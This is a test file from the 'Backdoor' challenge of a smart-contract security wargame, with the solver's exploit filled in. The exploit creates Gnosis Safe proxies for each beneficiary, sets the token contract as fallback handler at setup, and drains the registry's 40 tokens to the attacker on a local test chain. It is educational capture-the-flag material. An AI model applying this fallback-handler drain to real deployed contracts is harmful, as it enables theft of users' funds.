const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    // ------------------------------------------ EXPLOIT ------------------------------------------
    // 1. Create a proxy contract for each beneficiary of the wallet registry by calling 
    //    'createProxyWithCallback()' in the proxy factory contract
    //    - Each proxy is created with one owner (beneficiary)
    //    - Setup proxy contracts to call the token contract when the proxy fallback function is
    //      excuted
    // 2. Call new proxies with ERC20.transfer() call data
    //    - Proxy contract will execute fallback function since 'transfer()' is not present
    //    - Proxy contract calls token contract with 'transfer()' call data
    //    - Token contract transfers tokens from proxy to attacker
    // ---------------------------------------------------------------------------------------------
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const WalletRegistryExploit = await ethers.getContractFactory('WalletRegistryExploit', deployer);
        const exploit = await WalletRegistryExploit.deploy(this.walletFactory.address, this.walletRegistry.address, this.token.address);
        const initializers = users.map((user) => {
            return this.masterCopy.interface.encodeFunctionData("setup", [
                [user],
                1,
                ethers.constants.AddressZero,
                "0x",
                this.token.address,
                ethers.constants.AddressZero,
                0,
                ethers.constants.AddressZero
            ]);
        });
        await exploit.connect(attacker).exploit(this.masterCopy.address, initializers);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
